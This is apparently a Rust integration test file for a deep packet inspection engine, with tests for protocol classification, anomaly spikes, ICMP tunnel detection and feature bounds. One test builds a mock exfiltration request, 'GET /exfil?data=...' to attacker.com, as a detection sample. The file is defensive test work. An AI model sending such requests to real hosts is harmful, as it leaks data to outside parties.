//! Integration tests for the Thor Neural DPI engine.

use thor_ids::dpi::{DpiEngine, packet_encoder, protocol_classifier, covert_channel_detector};
use thor_ids::dpi::packet_encoder::{encode_packet, shannon_entropy, FEATURE_DIM};
use thor_ids::dpi::protocol_classifier::{classify, Protocol};
use thor_ids::dpi::covert_channel_detector::CovertChannelDetector;
use thor_ids::dpi::anomaly_detector::AnomalyDetector;

fn make_tcp_packet(src_ip: [u8;4], dst_ip: [u8;4], dst_port: u16, payload: &[u8]) -> Vec<u8> {
    let payload_len = payload.len();
    let total_len = (40 + payload_len) as u16;
    let mut pkt = vec![
        // IPv4 header (20 bytes)
        0x45, 0x00,
        (total_len >> 8) as u8, (total_len & 0xff) as u8,
        0x00, 0x01, 0x40, 0x00,
        0x40, 0x06, 0x00, 0x00,
        src_ip[0], src_ip[1], src_ip[2], src_ip[3],
        dst_ip[0], dst_ip[1], dst_ip[2], dst_ip[3],
        // TCP header (20 bytes)
        0x1f, 0x90,
        (dst_port >> 8) as u8, (dst_port & 0xff) as u8,
        0x00, 0x00, 0x00, 0x01,
        0x00, 0x00, 0x00, 0x00,
        0x50, 0x18, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00,
    ];
    pkt.extend_from_slice(payload);
    pkt
}

/// Test 1: Complete DPI pipeline on HTTP traffic
#[test]
fn test_dpi_http_traffic_full_pipeline() {
    let engine = DpiEngine::new();
    let payload = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
    let pkt = make_tcp_packet([10,0,0,1], [10,0,0,2], 80, payload);

    let result = engine.analyze(&pkt, "10.0.0.1:10.0.0.2:80", 6, 80, Some("10.0.0.1"));

    assert!(result.features.is_some(), "Features should be extractable");
    assert_eq!(result.features.unwrap().len(), FEATURE_DIM);
    assert!(result.protocol.is_some());
    let proto = result.protocol.unwrap();
    assert_eq!(proto.protocol, Protocol::Http);
    assert!(!proto.port_mismatch, "HTTP on port 80 should not be a mismatch");
}

/// Test 2: Port-protocol mismatch triggers high threat score
#[test]
fn test_dpi_http_on_https_port_is_suspicious() {
    let engine = DpiEngine::new();
    let payload = b"GET /exfil?data=aGVsbG93b3JsZA== HTTP/1.1\r\nHost: attacker.com\r\n\r\n";
    let pkt = make_tcp_packet([192,168,1,100], [1,2,3,4], 443, payload);

    let result = engine.analyze(&pkt, "192.168.1.100:1.2.3.4:443", 6, 443, Some("192.168.1.100"));

    // HTTP payload on port 443 should trigger port mismatch
    if let Some(proto) = &result.protocol {
        if proto.is_suspicious() {
            assert!(result.threat_score > 0.3, "Suspicious traffic should have elevated threat score");
        }
    }
}

/// Test 3: Anomaly detection baseline establishment and spike detection
#[test]
fn test_dpi_anomaly_spike_after_baseline() {
    let engine = DpiEngine::new();
    let key = "anomaly-test-stream";

    // Establish baseline with consistent small packets
    for i in 0..50 {
        let payload = vec![0xAAu8; 50]; // ~50 byte payload
        let pkt = make_tcp_packet([10,0,0,1], [10,0,0,2], 80, &payload);
        engine.analyze(&pkt, key, 6, 80, Some("10.0.0.1"));
    }

    // Now inject a very large packet — should be anomalous
    let large_payload = vec![0xBBu8; 5000];
    let large_pkt = make_tcp_packet([10,0,0,1], [10,0,0,2], 80, &large_payload);
    let result = engine.analyze(&large_pkt, key, 6, 80, Some("10.0.0.1"));

    if let Some(ref anomaly) = result.anomaly {
        if anomaly.is_anomalous {
            assert!(anomaly.score > 0.0, "Anomaly score should be positive");
        }
    }
}

/// Test 4: ICMP tunnel detection integration
#[test]
fn test_dpi_icmp_tunnel_detection() {
    let detector = CovertChannelDetector::new();
    // ICMP echo (type=8) with large, high-entropy payload
    let mut icmp = vec![0x08u8, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01];
    // Append 200 bytes of varied data (not all same, to create some entropy)
    for i in 0u8..200 { icmp.push(i); }

    let alerts = detector.analyze(&icmp, 1, 0, Some("10.10.10.10"));

    // Should detect ICMP tunnel (oversized payload)
    let icmp_alerts: Vec<_> = alerts.iter()
        .filter(|a| a.channel_type == covert_channel_detector::ChannelType::IcmpTunnel)
        .collect();
    assert!(!icmp_alerts.is_empty(), "ICMP tunnel should be detected");
    assert!(icmp_alerts[0].confidence > 0.3);
}

/// Test 5: Packet feature vector bounds validation
#[test]
fn test_packet_features_all_in_bounds() {
    let pkt = make_tcp_packet([172,16,0,1], [8,8,8,8], 53,
        b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01");
    let feat = encode_packet(&pkt).expect("Valid packet should yield features");

    for (i, &f) in feat.iter().enumerate() {
        assert!(
            f >= 0.0 && f <= 1.0 || f > 1.0 && i == 0 || f > 1.0 && i == 5,
            "Feature[{}] = {} out of expected range", i, f
        );
        assert!(f.is_finite(), "Feature[{}] = {} is not finite", i, f);
    }
}
